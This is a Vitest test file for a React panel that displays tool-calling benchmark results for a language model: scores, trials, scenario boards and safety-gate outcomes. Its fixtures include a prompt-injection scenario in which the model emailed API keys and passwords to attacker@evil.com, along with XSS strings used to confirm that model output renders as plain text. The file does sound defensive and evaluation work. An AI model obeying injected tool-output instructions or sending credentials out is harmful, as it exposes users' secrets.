import { fireEvent, render, screen, within } from '@testing-library/react';
import { beforeEach, describe, expect, it, vi } from 'vitest';
import { announce } from '../../../design/components/LiveAnnouncer';
import type { BenchRun, NodeBenchState } from '../../../lib/types';
import { run as benchRun } from '../fixtures';
import { evalRun, FIXTURES, NOW } from './fixtures';
import { ToolEvalSection } from './ToolEvalSection';

vi.mock('../../../design/components/LiveAnnouncer', async (importActual) => ({
  ...(await importActual<typeof import('../../../design/components/LiveAnnouncer')>()),
  announce: vi.fn(),
}));

beforeEach(() => {
  vi.mocked(announce).mockClear();
});

const show = (run: BenchRun) => render(<ToolEvalSection run={run} spec={undefined} />);

/** The run with one record's text replaced (model-produced strings must stay plain text). */
function withRecord(run: BenchRun, id: string, patch: Record<string, unknown>): BenchRun {
  const st = run.node_states?.spark1 as NodeBenchState;
  const detail = { ...st.detail, [`te:${id}`]: { ...(st.detail?.[`te:${id}`] as Record<string, unknown>), ...patch } };
  return { ...run, node_states: { spark1: { ...st, detail } } };
}

describe('ToolEvalSection', () => {
  it('shows nothing for runs without tool-eval data', () => {
    const { container, rerender } = show(benchRun({ id: 'old' }));
    expect(container).toBeEmptyDOMElement();
    rerender(<ToolEvalSection run={{ ...FIXTURES.waiting(), status: 'failed' }} spec={undefined} />);
    expect(container).toBeEmptyDOMElement();
  });

  it('shimmers in the board’s shape while the endpoint is checked, saying what the payload is doing', () => {
    const { rerender } = show(FIXTURES.waiting());
    const panel = screen.getByRole('region', { name: 'Tool-calling evaluation' });
    expect(panel).toHaveAttribute('aria-busy', 'true');
    expect(within(panel).getByText('Checking tool calling · http://127.0.0.1:8000/v1')).toBeInTheDocument();
    expect(within(panel).getByText('tool-eval-bench · Standard 69 · thinking on')).toBeInTheDocument();
    expect(panel.querySelectorAll('.te-tiles .skeleton')).toHaveLength(69);
    rerender(<ToolEvalSection run={{ ...FIXTURES.waiting(), phase: 'Starting…' }} spec={undefined} />);
    expect(screen.getByText('Checking that http://127.0.0.1:8000/v1 accepts tool calls…')).toBeInTheDocument();
  });

  it('shows the score so far, the verdict counts, the running scenario, warnings and recent results', () => {
    show(FIXTURES.mid(NOW));
    const panel = screen.getByRole('region', { name: 'Tool-calling evaluation' });
    expect(within(panel).getByText('tool-eval-bench 2.8.0 · Standard 69 · thinking on · Qwen/Qwen3.6-35B-A3B-FP8')).toBeInTheDocument();
    // Elapsed and remaining time are the run's Progress panel's alone.
    expect(within(panel).queryByText('Remaining')).toBeNull();
    expect(within(panel).queryByText('Elapsed')).toBeNull();
    expect(within(panel).getByRole('img', { name: 'Score so far: 89%' })).toBeInTheDocument();
    expect(within(panel).getByText('62 of 70 points')).toBeInTheDocument();
    expect(within(panel).getByRole('img', { name: '35 of 69 scenarios done: 29 passed, 4 partial, 2 failed, 0 excluded' })).toBeInTheDocument();
    const now = within(panel).getByRole('region', { name: 'Now running' });
    expect(now).toHaveTextContent('TC-36 Missing Required Info');
    expect(now).toHaveTextContent('No recipient, subject, or body — must ask for details, not guess.');
    expect(within(now).getByRole('img', { name: 'Difficulty 3 of 5 (medium)' })).toBeInTheDocument();
    expect(within(panel).getByText('Reasoning text arrives inside the answer')).toBeInTheDocument();
    expect(within(panel).getByRole('button', { name: 'TC-31 Ambiguity Resolution: failed. Sent an email without resolving the ambiguity.' })).toBeInTheDocument();
  });

  it('has one tile per scenario, a single tab stop and arrow-key movement; finished tiles open the dialog', () => {
    show(FIXTURES.mid(NOW));
    const board = screen.getByRole('group', { name: 'Scenario board' });
    const tiles = within(board).getAllByRole('button');
    expect(tiles).toHaveLength(69);
    expect(tiles.filter((t) => t.tabIndex === 0)).toHaveLength(1);
    expect(within(board).getByRole('group', { name: 'A · Tool Selection: 100%, 3 of 3 done' })).toBeInTheDocument();
    expect(within(board).getByRole('button', { name: 'TC-36, running' })).toHaveAttribute('aria-disabled', 'true');
    expect(within(board).getByRole('button', { name: 'TC-37, not run yet' })).toHaveAttribute('aria-disabled', 'true');

    const first = within(board).getByRole('button', { name: 'TC-01, passed' });
    first.focus();
    fireEvent.keyDown(first, { key: 'ArrowRight' });
    expect(within(board).getByRole('button', { name: 'TC-02, passed' })).toHaveFocus();
    fireEvent.keyDown(document.activeElement as Element, { key: 'ArrowDown' });
    expect(within(board).getByRole('button', { name: 'TC-05, passed' })).toHaveFocus(); // B's second tile
    expect(within(board).getByRole('button', { name: 'TC-05, passed' }).tabIndex).toBe(0);
    fireEvent.keyDown(document.activeElement as Element, { key: 'End' });
    expect(within(board).getByRole('button', { name: 'TC-69, not run yet' })).toHaveFocus();

    fireEvent.click(within(board).getByRole('button', { name: 'TC-08, partial' }));
    const dialog = screen.getByRole('dialog', { name: 'TC-08 · Conditional Branching' });
    expect(within(dialog).getByText('Pass if it checks Paris weather first and only then sets the umbrella reminder.')).toBeInTheDocument();
    expect(within(dialog).getByText('Read the weather correctly, but stopped short of setting the reminder.')).toBeInTheDocument();
    expect(within(dialog).getByRole('region', { name: 'Trace of TC-08' })).toHaveTextContent('scenario=TC-08 Conditional Branching');
    fireEvent.click(within(dialog).getByRole('button', { name: 'Close' }));
    expect(screen.queryByRole('dialog')).toBeNull();
  });

  it('announces quarter milestones only as they are crossed', () => {
    const { rerender } = show(FIXTURES.mid(NOW)); // 35 of 69: already past half when opened
    expect(announce).not.toHaveBeenCalled();
    rerender(<ToolEvalSection run={evalRun({ id: 'te-mid', done: 52, now: NOW })} spec={undefined} />);
    expect(announce).toHaveBeenCalledTimes(1);
    expect(vi.mocked(announce).mock.calls[0]?.[0]).toMatch(/^Tool-calling evaluation 75% done: 52 of 69 scenarios, score so far \d+%\.$/);
  });

  it('marks exclusions while running', () => {
    show(FIXTURES.late(NOW));
    expect(screen.getByText('2 scenarios excluded so far')).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'TC-46, excluded' })).not.toHaveAttribute('aria-disabled');
  });

  it('switches between nodes when several ran it', () => {
    show(FIXTURES.twoNodes(NOW));
    const picker = screen.getByRole('radiogroup', { name: 'Node' });
    expect(screen.getByText('30 of 69 scenarios')).toBeInTheDocument();
    fireEvent.click(within(picker).getByRole('radio', { name: 'spark2' }));
    expect(screen.getByText('23 of 69 scenarios')).toBeInTheDocument();
  });

  it('announces no milestone when switching to a node that is further along', () => {
    show(evalRun({ id: 'te-two', nodes: ['spark1', 'spark2'], done: 40, now: NOW })); // spark1 past half, spark2 not
    const picker = screen.getByRole('radiogroup', { name: 'Node' });
    fireEvent.click(within(picker).getByRole('radio', { name: 'spark2' }));
    fireEvent.click(within(picker).getByRole('radio', { name: 'spark1' }));
    expect(announce).not.toHaveBeenCalled();
  });

  it('shows the nodes with something to show when another failed before finishing a scenario', () => {
    const early = evalRun({ id: 'te-mix', status: 'failed', done: 0, nodes: ['spark1'] }); // a snapshot, nothing graded
    const later = evalRun({ id: 'te-mix', status: 'cancelled', done: 3, nodes: ['spark2'] });
    show({ ...later, status: 'failed', nodes: ['spark1', 'spark2'], node_states: { spark1: early.node_states?.spark1, spark2: later.node_states?.spark2 } as Record<string, NodeBenchState> });
    expect(screen.getByText('Incomplete: the evaluation was cancelled after 3 of 69 scenarios')).toBeInTheDocument();
    expect(screen.queryByRole('radiogroup', { name: 'Node' })).toBeNull();
  });

  it('keeps an open scenario dialog in place when the run finishes', () => {
    const { rerender } = show(evalRun({ id: 'te-y', done: 68, now: NOW }));
    fireEvent.click(screen.getByRole('button', { name: 'TC-08, partial' }));
    const dialog = screen.getByRole('dialog', { name: 'TC-08 · Conditional Branching' });
    rerender(<ToolEvalSection run={evalRun({ id: 'te-y', status: 'succeeded' })} spec={undefined} />);
    expect(screen.getByRole('dialog', { name: 'TC-08 · Conditional Branching' })).toBe(dialog);
  });
});

describe('after the run', () => {
  it('summarises the score, rating, gate and facts, then categories and every scenario', () => {
    show(FIXTURES.done());
    const panel = screen.getByRole('region', { name: 'Tool-calling evaluation' });
    expect(within(panel).getByRole('img', { name: 'Tool-calling score 88%, rated Good' })).toBeInTheDocument();
    expect(within(panel).getByText('121 of 138 points')).toBeInTheDocument();
    expect(within(panel).getByText('Scenarios graded').nextSibling).toHaveTextContent('100%');
    expect(within(panel).getByText('Safety gate').nextSibling).toHaveTextContent('Passed');
    expect(within(panel).getByRole('link', { name: 'tool-eval-bench' })).toHaveAttribute('href', 'https://github.com/SeraphimSerapis/tool-eval-bench');
    expect(panel).toHaveTextContent('Scores compare only between runs of the same tool-eval-bench version and settings (fingerprint 91e83f4571bb).');

    const cats = screen.getByRole('list', { name: 'Score per category' });
    const weakest = within(cats).getByText('Weakest').closest('li');
    expect(weakest).toHaveTextContent(/I · Context & State.*70%.*5 passed.*4 partial.*1 failed/);
    expect(screen.queryByRole('list', { name: 'Hard Mode score per capability' })).toBeNull();

    const table = screen.getByRole('table', { name: 'Scenario results' });
    expect(within(table).getAllByRole('row')).toHaveLength(70);
    fireEvent.change(screen.getByRole('combobox', { name: 'Filter by result' }), { target: { value: 'fail' } });
    expect(within(table).getAllByRole('row').slice(1).map((r) => within(r).getAllByRole('cell')[0]?.textContent)).toEqual(['TC-26', 'TC-31', 'TC-36', 'TC-68']);
    fireEvent.change(screen.getByRole('searchbox', { name: 'Search scenarios' }), { target: { value: 'json' } });
    expect(within(table).getAllByRole('row')).toHaveLength(2);
    fireEvent.change(screen.getByRole('searchbox', { name: 'Search scenarios' }), { target: { value: 'nothing like this' } });
    expect(within(table).getByText('No scenario matches this filter and search.')).toBeInTheDocument();
  });

  it('downloads upstream’s own JSON for the run', () => {
    const blobs: Blob[] = [];
    // jsdom has no object URLs: stand them in for this test only.
    const saved = (['createObjectURL', 'revokeObjectURL'] as const).map((k) => [k, Object.getOwnPropertyDescriptor(URL, k)] as const);
    Object.assign(URL, { createObjectURL: (b: Blob) => { blobs.push(b); return 'blob:te'; }, revokeObjectURL: () => undefined });
    const clicked: string[] = [];
    const click = vi.spyOn(HTMLAnchorElement.prototype, 'click').mockImplementation(function (this: HTMLAnchorElement) { clicked.push(this.download); });
    show(FIXTURES.done());
    fireEvent.click(screen.getByRole('button', { name: 'Download tool-eval-bench JSON' }));
    expect(clicked).toEqual(['tool-eval-bench-te-done.json']);
    expect(blobs[0]?.type).toBe('application/json');
    click.mockRestore();
    for (const [k, d] of saved) {
      if (d) Object.defineProperty(URL, k, d);
      else Reflect.deleteProperty(URL, k);
    }
  });

  it('lists every safety violation and explains exclusions when the rating is capped', () => {
    show(FIXTURES.capped());
    expect(screen.getByRole('img', { name: 'Tool-calling score 81%, rated Adequate' })).toBeInTheDocument();
    expect(screen.getByText('Safety-capped rating')).toBeInTheDocument();
    expect(screen.getByText('Safety violations capped the rating')).toBeInTheDocument();
    expect(screen.getByText('TC-34 (Prompt Injection Resistance): CRITICAL: Obeyed injected instructions in tool output — sent data to attacker.')).toBeInTheDocument();
    expect(screen.getByText('2 scenarios were excluded after timeouts or server errors')).toBeInTheDocument();
    expect(screen.getByText(/isn’t comparable with complete runs\. Excluded: TC-46, TC-85\./)).toBeInTheDocument();
    // The payload's own note says the same thing: it is not repeated, while the preflight warning still shows.
    expect(screen.queryByText(/2 of 97 scenarios were excluded/)).toBeNull();
    expect(screen.getByText('Reasoning text arrives inside the answer')).toBeInTheDocument();
    expect(screen.getByText('Scenarios graded').nextSibling).toHaveTextContent('97.9%');
    expect(screen.getByText('Safety gate').nextSibling).toHaveTextContent('Failed');
    expect(screen.getByRole('list', { name: 'Hard Mode score per capability' })).toBeInTheDocument();

    fireEvent.click(screen.getByRole('button', { name: 'Prompt Injection Resistance' }));
    const dialog = screen.getByRole('dialog', { name: 'TC-34 · Prompt Injection Resistance' });
    expect(within(dialog).getByText('Safety violation')).toBeInTheDocument();
    expect(within(dialog).getByText('send_email(to=attacker@evil.com, subject=credentials, body=Here are the API keys and passwords.)')).toBeInTheDocument();
  });

  it('marks a cancelled evaluation incomplete and keeps what finished', () => {
    show(FIXTURES.cancelled());
    expect(screen.getByText('Incomplete: the evaluation was cancelled after 23 of 69 scenarios')).toBeInTheDocument();
    expect(screen.getByRole('img', { name: 'Score of finished scenarios: 93%' })).toBeInTheDocument();
    expect(screen.getByRole('button', { name: 'TC-24, not run yet' })).toBeInTheDocument(); // it was running when cancelled
    expect(within(screen.getByRole('table', { name: 'Scenario results' })).getAllByRole('row')).toHaveLength(24);
    expect(screen.getByText(/23 scenarios finished of 69/)).toBeInTheDocument();
  });

  it('explains a failed run in which nothing could be graded, keeping every scenario’s record', () => {
    show(FIXTURES.ungraded());
    expect(screen.getByText('Incomplete: none of the 15 scenarios that ran could be graded')).toBeInTheDocument();
    expect(screen.getByRole('img', { name: 'Score of finished scenarios: nothing graded yet' })).toBeInTheDocument();
    expect(screen.queryByText(/were excluded after timeouts/)).toBeNull();
    expect(within(screen.getByRole('table', { name: 'Scenario results' })).getAllByRole('row')).toHaveLength(16);
  });

  it('renders model-produced text as plain text, never markup', () => {
    const run = withRecord(FIXTURES.done(), 'TC-01', { summary: '<b>bold</b> **not markdown**', tool_calls: ['<img src=x onerror=alert(1)>'], trace: '<script>alert(1)</script>' });
    const { container } = show(run);
    fireEvent.click(screen.getByRole('button', { name: 'Direct Specialist Match' }));
    const dialog = screen.getByRole('dialog');
    expect(within(dialog).getByText('<b>bold</b> **not markdown**')).toBeInTheDocument();
    expect(within(dialog).getByText('<img src=x onerror=alert(1)>')).toBeInTheDocument();
    expect(container.ownerDocument.querySelector('dialog b, dialog img, dialog script')).toBeNull();
  });

  it('counts the score up from zero for a run seen finishing here, and says the result once', () => {
    const { rerender } = show(evalRun({ id: 'te-x', done: 68, now: NOW }));
    vi.mocked(announce).mockClear();
    rerender(<ToolEvalSection run={evalRun({ id: 'te-x', status: 'succeeded' })} spec={undefined} />);
    // The result view mounts already knowing: the ring starts at 0 and climbs to the score on the next frame.
    expect(document.querySelector('.te-ring__num')).toHaveTextContent(/^0$/);
    expect(announce).toHaveBeenCalledTimes(1);
    expect(announce).toHaveBeenCalledWith('Tool-calling score 88%, rated Good.', 'warning');
  });

  it('shows the score at once for a run opened after it finished', () => {
    show(FIXTURES.done());
    expect(document.querySelector('.te-ring__num')).toHaveTextContent(/^88$/);
    expect(announce).not.toHaveBeenCalled();
  });

  it('says why an excluded scenario lists no tool calls without contradicting its turns', () => {
    show(FIXTURES.capped());
    fireEvent.click(screen.getByRole('button', { name: 'Deep Multi-Turn Research (5 turns)' })); // timed out after a turn
    expect(within(screen.getByRole('dialog')).getByText(/^None listed: upstream records no tool calls for a scenario that was cut off\./)).toBeInTheDocument();
    fireEvent.click(within(screen.getByRole('dialog')).getByRole('button', { name: 'Close' }));
    fireEvent.click(screen.getByRole('button', { name: 'Exactly-Once Provisioning After Ambiguous Commit' })); // HTTP 503 at once
    expect(within(screen.getByRole('dialog')).getByText('None: the request failed before the model answered.')).toBeInTheDocument();
  });

  it('counts every tool call when the payload cut the list, noting the ones not listed', () => {
    const calls = [...Array.from({ length: 31 }, (_, i) => `search_files(query=part ${i + 1})`), '… 9 more'];
    show(withRecord(FIXTURES.done(), 'TC-07', { tool_calls: calls }));
    fireEvent.click(screen.getByRole('button', { name: 'Search → Read → Act' }));
    const dialog = screen.getByRole('dialog');
    expect(within(dialog).getByRole('heading', { name: 'Tool calls · 40' })).toBeInTheDocument();
    expect(dialog.querySelectorAll('.te-calls > li')).toHaveLength(31);
    expect(within(dialog).getByText('9 more calls aren’t listed.')).toBeInTheDocument();
    expect(within(dialog).queryByText('… 9 more')).toBeNull();
  });
});

describe('several trials', () => {
  it('names the trials and the seed, shows the trial running and the finished ones’ scores with their mean', () => {
    show(FIXTURES.trialsLive(NOW));
    const panel = screen.getByRole('region', { name: 'Tool-calling evaluation' });
    expect(within(panel).getByText('tool-eval-bench 2.8.0 · Standard 69 · 8 trials · seed 42 · thinking on · Qwen/Qwen3.6-35B-A3B-FP8')).toBeInTheDocument();
    expect(within(panel).getByRole('img', { name: /^Trial 4 score so far: \d+%$/ })).toBeInTheDocument();
    const trials = within(panel).getByRole('region', { name: 'Trials' });
    expect(trials).toHaveTextContent('Trial 4 of 8');
    expect(trials).toHaveTextContent('Mean so far 85.7 ± 2.5 · 3 of 8 finished');
    expect(within(trials).getByRole('img', { name: 'Score per trial on a 0 to 100 scale: trial 1 88%, trial 2 83%, trial 3 86%; trial 4 running; 4 still to run; mean 85.7' })).toBeInTheDocument();
  });

  it('shows each scenario’s verdict per trial on the board, this trial’s verdict first', () => {
    show(FIXTURES.trialsLive(NOW));
    const board = screen.getByRole('group', { name: 'Scenario board' });
    expect(within(board).getByRole('button', { name: 'TC-01, passed; trials so far: 4 passed' })).not.toHaveAttribute('aria-disabled');
    expect(within(board).getByRole('button', { name: 'TC-31, running; trials so far: 3 failed' })).toBeInTheDocument();
    // Not yet run in trial 4: still a pending tile, whatever its record from trial 3 says.
    expect(within(board).getByRole('button', { name: 'TC-32, not run yet; trials so far: 3 passed' })).toHaveAttribute('aria-disabled', 'true');
    expect(board.querySelectorAll('.te-tile--trials')).toHaveLength(69);
  });

  it('waits for the first trial before showing a mean', () => {
    show(FIXTURES.trialsFirst(NOW));
    const trials = screen.getByRole('region', { name: 'Trials' });
    expect(trials).toHaveTextContent('Trial 1 of 4');
    expect(within(trials).getByText('Each trial’s score and the mean appear here as the trials finish.')).toBeInTheDocument();
    expect(within(trials).getByRole('img', { name: 'Score per trial on a 0 to 100 scale: none finished yet; trial 1 running; 3 still to run' })).toBeInTheDocument();
  });

  it('announces milestones over every trial, not each trial’s own', () => {
    const { rerender } = show(FIXTURES.trialsLive(NOW)); // 237 of 552 scenario runs
    expect(announce).not.toHaveBeenCalled();
    rerender(<ToolEvalSection run={evalRun({ id: 'te-trials-live', trials: 8, trial: 5, seed: 42, done: 0, now: NOW })} spec={undefined} />);
    expect(announce).toHaveBeenCalledWith('Tool-calling evaluation 50% done: trial 5 of 8.', 'warning');
  });

  it('leads with the mean, every trial’s score and how reliably scenarios pass', () => {
    show(FIXTURES.trialsDone());
    const panel = screen.getByRole('region', { name: 'Tool-calling evaluation' });
    expect(within(panel).getByRole('img', { name: 'Mean tool-calling score 85.4% over 8 trials, rated Good' })).toBeInTheDocument();
    expect(document.querySelector('.te-ring__num')).toHaveTextContent(/^85\.4$/);
    expect(within(panel).getByText('Mean of 8 trials')).toBeInTheDocument();
    expect(within(panel).getByText('± 2.1 points (σ)')).toBeInTheDocument();
    expect(within(panel).getByRole('img', { name: /^Score of each of the 8 trials, on a 80 to 90 scale: 88, 83, 86, 88, 85, 86, 85, 82; mean 85\.4; 95% confidence interval 83\.9 to 86\.9; range 82 to 88$/ })).toBeInTheDocument();

    const across = within(panel).getByRole('region', { name: 'Across 8 trials' });
    const kpi = (label: string) => within(across).getByText(label).parentElement;
    expect(kpi('Pass@8')).toHaveTextContent('Pass@885.5%Passed in at least one trial');
    expect(kpi('Pass^8')).toHaveTextContent('Pass^865.2%Passed in every trial');
    expect(kpi('Reliability gap')).toHaveTextContent('20.3 ptsPass@8 minus pass^8');
    expect(kpi('Flaky scenarios')).toHaveTextContent('14Passed only sometimes · 10 never passed');
    expect(kpi('Scenarios graded')).toHaveTextContent('99.8%551 of 552 scenario runs');
    expect(kpi('Safety gate')).toHaveTextContent('PassedNo violations in any trial');
    expect(within(panel).getByRole('region', { name: 'Trial 8 of 8' })).toHaveTextContent('Deployability');

    const cats = screen.getByRole('list', { name: 'Score per category' });
    expect(cats.querySelectorAll('.te-row__whisker').length).toBeGreaterThan(0);
    expect(within(cats).getByText('Weakest').closest('li')).toHaveTextContent(/±/);
  });

  it('says whose verdicts the table shows, filters flaky and never-passed scenarios, and shows every trial in the dialog', () => {
    show(FIXTURES.trialsDone());
    expect(screen.getByText(/69 scenarios · showing trial 8 of 8’s verdicts/)).toBeInTheDocument();
    const table = screen.getByRole('table', { name: 'Scenario results' });
    expect(within(table).getByRole('columnheader', { name: /Trials/ })).toBeInTheDocument();
    const filter = screen.getByRole('combobox', { name: 'Filter by result' });
    expect(within(filter).getByRole('option', { name: 'Flaky (14)' })).toBeInTheDocument();
    fireEvent.change(filter, { target: { value: 'never' } });
    expect(within(table).getAllByRole('row')).toHaveLength(11);
    fireEvent.change(filter, { target: { value: 'flaky' } });
    expect(within(table).getAllByRole('row')).toHaveLength(15);
    fireEvent.click(within(table).getByRole('button', { name: 'Direct Specialist Match' })); // TC-01, flaky
    const dialog = screen.getByRole('dialog', { name: 'TC-01 · Direct Specialist Match' });
    expect(within(dialog).getAllByRole('listitem').filter((li) => /^Trial \d/.test(li.textContent))).toHaveLength(8);
    expect(within(dialog).getByText('The verdict, tool calls and trace below are from trial 8, the latest.')).toBeInTheDocument();
  });

  it('keeps a single trial exactly as before: no trial rail, pips, statistics or trial column', () => {
    show(FIXTURES.done());
    expect(screen.queryByRole('region', { name: /trials/i })).toBeNull();
    expect(screen.queryByRole('columnheader', { name: /Trials/ })).toBeNull();
    expect(screen.getByRole('columnheader', { name: /Result/ })).toBeInTheDocument();
    expect(document.querySelector('.te-pips, .te-tplot, .te-row__whisker')).toBeNull();
    fireEvent.click(screen.getByRole('button', { name: 'Direct Specialist Match' }));
    expect(within(screen.getByRole('dialog')).queryByText('Every trial')).toBeNull();
  });

  it('marks the trial a cancelled run stopped in, keeping the finished trials’ scores', () => {
    show(FIXTURES.trialsCancelled());
    expect(screen.getByText('Incomplete: the evaluation was cancelled in trial 3 of 5, after 23 of 69 scenarios')).toBeInTheDocument();
    expect(screen.getByRole('img', { name: /^Trial 3 score of finished scenarios: \d+%$/ })).toBeInTheDocument();
    const trials = screen.getByRole('region', { name: 'Trials' });
    expect(trials).toHaveTextContent('Trial 3 of 5 · stoppedMean 85.5 ± 3.5 · 2 of 5 finished');
    expect(within(trials).getByRole('img', { name: /^Score per trial on a 0 to 100 scale: trial 1 88%, trial 2 83%; trial 3 stopped; 2 still to run; mean 85\.5$/ })).toBeInTheDocument();
    expect(screen.getByText(/69 scenarios finished of 69 · each one’s latest trial/)).toBeInTheDocument();
  });
});
